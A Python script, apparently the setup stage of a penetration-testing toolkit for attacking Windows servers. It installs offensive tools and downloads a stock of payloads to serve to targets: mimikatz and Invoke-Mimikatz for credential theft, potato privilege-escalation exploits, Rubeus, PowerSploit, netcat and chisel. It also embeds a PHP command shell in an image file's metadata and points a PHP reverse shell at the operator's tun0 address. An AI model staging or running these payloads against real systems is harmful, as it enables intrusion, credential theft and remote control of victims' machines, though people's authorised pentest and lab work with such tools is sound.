#!/usr/bin/python3
# coding:UTF-8

# -------------------------------------------------------------------------------------
#         PYTHON3 SCRIPT FILE FOR THE REMOTE ANALYSIS OF MICROSOFT SERVERS
#         BY TERENCE BROADBENT MSc DIGITAL FORENSICS & CYBERCRIME ANALYSIS
# -------------------------------------------------------------------------------------

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Thr3adSt0nE                                                             
# Details : Load any required imports.
# Modified: N/A
# -------------------------------------------------------------------------------------

import os
import sys
import os.path
import shutil

network = "tun0"	# CHANGE AS NECESSARY

# -------------------------------------------------------------------------------------
# SYSTEM REQUIREMENTS
# -------------------------------------------------------------------------------------

print("[+] Loading requirements...\n")
os.system("apt-get install seclists -y")
os.system("apt-get install python3-pip -y")
os.system("apt-get install python3-ldap -y")
os.system("apt-get install gobuster -y")
os.system("apt-get install crackmapexec -y")
os.system("apt-get install exiftool -y")
os.system("apt-get install rlwrap -y")
os.system("apt-get install xdotool -y")

os.system("gem install evil-winrm")

os.system("pip3 install kerbrute")
os.system("pip3 install smtp-user-enum")
os.system("pip3 install termcolor")

os.system("git clone https://github.com/ropnop/windapsearch.git")
os.system("mv windapsearch/windapsearch.py /usr/share/doc/python3-impacket/examples/windapsearch.py")
shutil.rmtree("windapsearch")

os.system("clear")

# -------------------------------------------------------------------------------------
# EXPLOITS
# -------------------------------------------------------------------------------------

if not os.path.exists("HTTPFILES"):
   os.system("mkdir HTTPFILES")
os.chdir("HTTPFILES")

os.system("wget https://download.sysinternals.com/files/Procdump.zip -O Procdump.zip")
os.system("unzip Procdump.zip")
if os.path.exists("Procdump.zip"):
   os.remove("Procdump.zip")
os.system("mv ./Procdump/procdump64.exe ./")
os.system("mv ./Procdump/procdump32.exe ./")
os.remove("Eula.txt")
os.remove("procdump64a.exe")
os.system("rmdir Procdump")

os.system("wget 'https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASx64.exe' -O winpeas64.exe")
os.system("wget 'https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASx86.exe' -O winpeas32.exe")

os.system("wget 'https://github.com/BloodHoundAD/BloodHound/raw/master/Ingestors/SharpHound.exe' -O sharphound.exe")
os.system("wget 'https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1' -O sharphound.ps1")

os.system("git clone https://github.com/TsukiCTF/Lovely-Potato.git")
os.system("mv ./Lovely-Potato/Invoke-LovelyPotato.ps1 ./lovelypotato.ps1")
os.system("mv ./Lovely-Potato/JuicyPotato-Static.exe ./juicypotato.exe")
os.system("mv ./Lovely-Potato/test_clsid.bat ./")
os.remove("./Lovely-Potato/README.md")
shutil.rmtree("Lovely-Potato")
os.system("wget 'https://github.com/antonioCoco/RoguePotato/releases/download/1.0/RoguePotato.zip' -O RoguePotato.zip")
os.system("unzip RoguePotato.zip")
os.remove("RoguePotato.zip")
os.system("mv ./RogueOxidResolver.exe ./rogueoxidresolver.exe")
os.system("mv ./RoguePotato.exe ./roguepotato.exe")

os.system("wget 'https://github.com/411Hall/JAWS/raw/master/jaws-enum.ps1' -O jawsenum.ps1")
os.system("wget 'https://github.com/besimorhino/powercat/raw/master/powercat.ps1' -O powercat.ps1")
os.system("wget 'https://github.com/HarmJ0y/PowerUp/raw/master/PowerUp.ps1' -O powerup.ps1")
os.system("wget 'https://github.com/S3cur3Th1sSh1t/WinPwn/raw/master/WinPwn.ps1' -O winpwn.ps1")
os.system("wget 'https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Out-Minidump.ps1' -O mimidump.ps1")
os.system("wget 'https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1' -O mimilatz.ps1")
os.system("wget 'https://github.com/PowerShellMafia/PowerSploit/raw/master/Recon/PowerView.ps1' -O powerview.ps1")
os.system("wget 'https://github.com/Kevin-Robertson/Powermad/raw/master/Powermad.ps1' -O powermad.ps1")

os.system("wget 'https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe' -O rubeus.exe")
os.system("wget 'https://nmap.org/dist/nmap-7.80-setup.exe' -O nmapsetup.exe")
os.system("cp /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe ./mimikatz32.exe")
os.system("cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe ./mimikatz64.exe")
os.system("cp /usr/share/windows-resources/binaries/nc.exe nc64.exe")
os.system("cp /usr/share/windows-resources/binaries/plink.exe plink64.exe")
os.system("wget 'https://github.com/jpillora/chisel/releases/download/v1.7.2/chisel_1.7.2_windows_amd64.gz' -O chisel.gz")
os.system("gunzip chisel.gz")
os.system("mv chisel chisel64.exe")
os.system("wget 'https://github.com/jpillora/chisel/releases/download/v1.7.2/chisel_1.7.2_windows_386.gz' -O chisel.gz")
os.system("gunzip chisel.gz")
os.system("mv chisel chisel32.exe")

os.system("wget 'https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php' -O webshell.php")
os.system("touch image.jpg")
command = "<h1>IMAGE SHELL<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';}  __halt_compiler();?></h1>"
os.system("exiftool -DocumentName=" + command + " image.jpg")
os.system("mv image.jpg image.php.jpg")
os.system("wget 'https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php' -O myshell.php")

os.system("ifconfig " + network +  " | grep 'inet ' | awk '{print $2}' | sed 's/addr://' > file.txt")
with open("file.txt", "r") as read:
   test = read.readline()
   command = "sed -i 's/127.0.0.1/" + test + "/g myshell.php"
   os.system(command)
os.remove("file.txt")

os.system("wget 'https://github.com/BroadbentT/WIN-HTTP-SERVER/blob/master/template.txt' -O template.txt")
os.chdir("..")
print("good job!! all done..")

#Eof
